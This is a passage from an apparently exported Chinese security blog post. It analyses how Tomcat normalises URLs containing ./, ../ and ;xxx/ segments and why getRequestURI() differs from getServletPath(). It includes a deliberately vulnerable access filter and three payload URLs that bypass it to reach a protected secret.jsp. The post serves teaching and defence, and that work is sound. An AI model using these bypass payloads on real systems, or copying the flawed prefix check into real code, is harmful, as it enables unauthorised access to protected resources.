URL解析差异性导致的安全问题","date":"2020-04-01T15:47:17.000Z","path":"2020/04/01/Tomcat-URL解析差异性及利用/","text":"先知：https://xz.aliyun.com/t/7544 0x01 简介Tomcat是常见的Web中间件，实际上是利用NIO技术处理HTTP请求，在接收到请求时会对客户端提交的参数、URL、Header和Body数据进行解析，并生成Request对象，然后调用实际的JSP或Servlet。 当后台程序使用getRequestURI()或getRequestURL()函数来解析用户请求的URL时，若URL中包含了一些特殊符号，则可能会造成访问限制绕过的安全风险。 0x02 URL解析差异性HttpServletRequest中几个解析URL的函数在Servlet处理URL请求的路径时，HTTPServletRequest有如下几个常用的函数： request.getRequestURL()：返回全路径； request.getRequestURI()：返回除去Host（域名或IP）部分的路径； request.getContextPath()：返回工程名部分，如果工程映射为/，则返回为空； request.getServletPath()：返回除去Host和工程名部分的路径； request.getPathInfo()：仅返回传递到Servlet的路径，如果没有传递额外的路径信息，则此返回Null； 网上的一个小结，Servlet的匹配路径为/test%3F/*，并且Web应用是部署在/app下，此时请求的URL为http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID?p+1=c+d&amp;p+2=e+f#a，各个函数解析如下表： 函数 URL解码 解析结构 getRequestURL() no http://30thh.loc:8480/app/test%3F/a%3F+b;jsessionid=s%3F+ID getRequestURI() no /app/test%3F/a%3F+b;jsessionid=s%3F+ID getContextPath() no /app getServletPath() yes /test? getPathInfo() yes /a?+b 特殊字符的URL解析新建一个Java Web项目，index.jsp如下： 1234567&lt;%out.println(\"getRequestURL(): \" + request.getRequestURL() + \"&lt;br&gt;\");out.println(\"getRequestURI(): \" + request.getRequestURI() + \"&lt;br&gt;\");out.println(\"getContextPath(): \" + request.getContextPath() + \"&lt;br&gt;\");out.println(\"getServletPath(): \" + request.getServletPath() + \"&lt;br&gt;\");out.println(\"getPathInfo(): \" + request.getPathInfo() + \"&lt;br&gt;\");%&gt; 正常访问Tomcat运行之后，正常访问http://localhost:8080/urltest/index.jsp，页面输出如下： 插入 ./ 访问尝试插入多个./访问即http://localhost:8080/urltest/./././index.jsp，页面输出如下： 可以看到，插入多个./也能正常访问。 接着尝试这种形式http://localhost:8080/urltest/.a/.bb/.ccc/index.jsp，发现是返回404，未找到该资源访问： 插入 ../ 访问尝试插入../访问即http://localhost:8080/urltest/../index.jsp，页面输出如下： 可以是返回的404，这是因为实际访问的是http://localhost:8080/index.jsp，这个目录文件当然不存在。 换种跨目录的形式就OK了http://localhost:8080/urltest/noexist/../index.jsp： 插入 ;/ 访问尝试插入多个;/访问即http://localhost:8080/urltest/;/;/;/index.jsp，页面输出如下： 可以看到，插入多个;也能正常访问。 在;号后面加上字符串也是能正常访问的，如http://localhost:8080/urltest/;a/;bb/;ccc/index.jsp： 插入其他特殊字符访问尝试插入如下这些特殊字符进行访问，页面均返回400或404，无法访问： 1` ~ ! @ # $ % ^ &amp; * ( ) - _ = + [ ] &#123; &#125; \\ | : &apos; &quot; &lt; &gt; ? 小结由前面的尝试知道，Tomcat中的URL解析是支持嵌入./、../、;xx/等特殊字符的。此外，getRequestURL()和getRequestURI()这两个函数解析提取的URL内容是包含我们嵌入的特殊字符的，当使用不当时会存在安全问题如绕过认证。 0x03 调试分析Tomcat会先对请求的URL进行解析处理，提取到一些信息之后才会到调用getRequestURI()等函数的流程。 Tomcat对URL特殊字符的处理这里我们先来调试分析下Tomcat是如何对请求URL中不同的特殊字符作不同的处理的。 经过调试分析，得知Tomcat是在CoyoteAdapter.service()函数上对请求URL进行解析处理的，直接在这里打上断点，此时的函数调用栈如下： 12345678service:452, CoyoteAdapter (org.apache.catalina.connector)process:1195, AbstractHttp11Processor (org.apache.coyote.http11)process:654, AbstractProtocol$AbstractConnectionHandler (org.apache.coyote)run:317, JIoEndpoint$SocketProcessor (org.apache.tomcat.util.net)runWorker:1142, ThreadPoolExecutor (java.util.concurrent)run:617, ThreadPoolExecutor$Worker (java.util.concurrent)run:61, TaskThread$WrappingRunnable (org.apache.tomcat.util.threads)run:745, Thread (java.lang) 在CoyoteAdapter.service()函数中，会调用postParseRequest()函数来解析URL请求内容： 跟进postParseRequest()函数中，其中先后调用parsePathParameters()和normalize()函数对请求内容进行解析处理： 这里我们先跟进parsePathParameters()函数，先是寻找URL中是否存在;号，找到的话才会进入下面的if代码逻辑： 如果找到了;号，在if代码逻辑中后面的循环体会将;xxx/中的分号与斜杠之间的字符串以及分号本身都去掉，我们访问http://localhost:8080/urltest/;mi1k7ea/index.jsp再试下，就可以进入该代码逻辑调试看到（代码中ASCII码59是;，47是/）： 由此可知，parsePathParameters()函数是对;xxx/这种形式进行处理的。 接着，跟进normalize()函数，该函数是对经过parsePathParameters()函数处理过后的请求URL进行标准化处理。 先看到这段代码，ASCII码92表示\\，当匹配到时将其替换为ASCII码为47的/；当匹配到ASCII码0即空字符时，直接返回false无法成功解析： 往下是这段循环，判断是否有连续的/，存在的话则循环删除掉多余的/： 接着往下看，这段循环就是对./和../这些特殊字符进行处理，如果这两个字符串都找不到则直接返回true： 这里尝试下添加/./访问的处理，看到找到之后是直接将其去掉然后继续放行： 这里尝试下添加/../访问的处理，看到找到后是会进行往前目录层级的回溯处理再拼接到上面某一层目录形成新的URL： 由此可知，normalize()函数对经过经过parsePathParameters()函数过滤过;xxx/的URL请求内容进标准化处理，具体为将连续的多个/给删除掉只保留一个、将/./删除掉、将/../进行跨目录拼接处理，最后返回处理后的URL路径。 结论 Tomcat对/;xxx/以及/./的处理是包容的、对/../会进行跨目录拼接处理。 getRequestURI()的处理我们直接在index.jsp中调用getRequestURI()函数的地方打上断点调试即可。 这里是直接调用Request.requestURI()函数然后直接返回其字符串值： 跟进Request.requestURI()函数，这里是直接返回请求的URL内容，没有做任何处理以及URL解码： getRequestURL()的处理在getRequestURL()函数中是调用了Request.getRequestURL()函数的： 跟进该函数，在提取了协议类型、host和port之后，调用了getRequestURI()函数获取URL请求的路径，然后直接拼接进URL直接返回而不做包括URL解码的任何处理： getServletPath()的处理在getServletPath()函数中是调用了Request.getServletPath()函数的： 跟进去，看到是直接返回前面Tomcat已经处理过后的提取处理的Servlet路径，注意这里是获取MappingData类对象中的wrapperPath属性值： getPathInfo()的处理和getServletPath()函数的处理是一样的，同样是返回前面经过Tomcat解析处理后的MappingData类对象中其中一个属性值，这里是获取的pathInfo属性值并直接返回： getContextPath()的处理在getContextPath()函数中，调用了Request.getContextPath()函数： 跟进该函数，先是调用getServletContext().getContextPath()来获取当前Servlet上下文路径以及调用getRequestURI()函数获取当前请求的目录路径： 往下的这段循环是处理uri变量值中如果存在多个连续的/则删除掉： 再往下，获取下一个/符号的位置，然后根据该位置索引对uri变量值进行工程名的切分提取： 接着，就是对刚刚切分得到的candidate变量进行和Tomcat一样的特殊字符处理过程，先调用removePathParameters()处理;和.，然后进行URL解码，再调用normalize()函数进行标准化处理，处理过后比较处理完的candidate变量值和之前获取的规范上下文路径是否一致，不一致的话就循环继续前面的操作直至一致为止： 最后，直接返回按pos索引切分的uri变量值： 0x04 攻击利用看个访问限制绕过的场景。 假设Tomcat上启动的Web目录下存在一个info目录，其中有一个secret.jsp文件，其中包含敏感信息等： 123456789101112&lt;%@ page contentType=\"text/html;charset=UTF-8\" language=\"java\" %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Secret&lt;/title&gt;&lt;/head&gt;&lt;body&gt;username: mi1k7ea&lt;br&gt;password: 123456&lt;br&gt;address: china&lt;br&gt;phone: 13666666666&lt;br&gt;&lt;/body&gt;&lt;/html&gt; 新建一个filter包，其中新建一个testFilter类，实现Filter接口类： 1234567891011121314151617181920212223242526272829303132package filter;import javax.servlet.*;import javax.servlet.http.*;import java.io.IOException;public class testFilter implements Filter &#123; @Override public void init(FilterConfig filterConfig) throws ServletException &#123; &#125; @Override public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException &#123; HttpServletRequest httpServletRequest = (HttpServletRequest)servletRequest; HttpServletResponse httpServletResponse = (HttpServletResponse)servletResponse; String url = httpServletRequest.getRequestURI(); if (url.startsWith(\"/urltest/info\")) &#123; httpServletResponse.getWriter().write(\"No Permission.\"); return; &#125; filterChain.doFilter(servletRequest, servletResponse); &#125; @Override public void destroy() &#123; &#125;&#125; 这个Filter作用是：只要访问/urltest/info目录下的资源，都需要进行权限判断，否则直接放行。可以看到，这里调用getRequestURI()函数来获取请求中的URL目录路径，然后调用startsWith()函数判断是否是访问的敏感目录，若是则返回无权限的响应。当然这里写得非常简单，只做演示用。 编辑web.xml，添加testFilter设置： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version=\"4.0\"&gt; &lt;filter&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;filter-class&gt;filter.testFilter&lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;testFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt; &lt;/filter-mapping&gt;&lt;/web-app&gt; 运行之后，访问http://localhost:8080/urltest/info/secret.jsp，会显示无权限： 根据前面的分析构造如下几个payload都能成功绕过认证限制来访问： 123http://localhost:8080/urltest/./info/secret.jsphttp://localhost:8080/urltest/;mi1k7ea/info/secret.jsphttp://localhost:8080/urltest/mi1k7ea/../info/secret.jsp 整个的过程大致如此，就是利用解析的差异性来绕过认证。 在前段时间爆出的Apache Shiro的CVE中，就是使用getRequestURI()函数导致的，这里可以看到人家的补丁是怎么打的，其实就是用getPathInfo()替换掉就OK了：https://github.com/apache/shiro/commit/3708d7907016bf2fa12691dff6ff0def1249b8ce 0x05 参考getRequestURI()带来的安全问题","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"},{"name":"Tomcat","slug":"Tomcat","permalink":"https://www.mi1k7ea.com/tags/Tomcat/"}]}]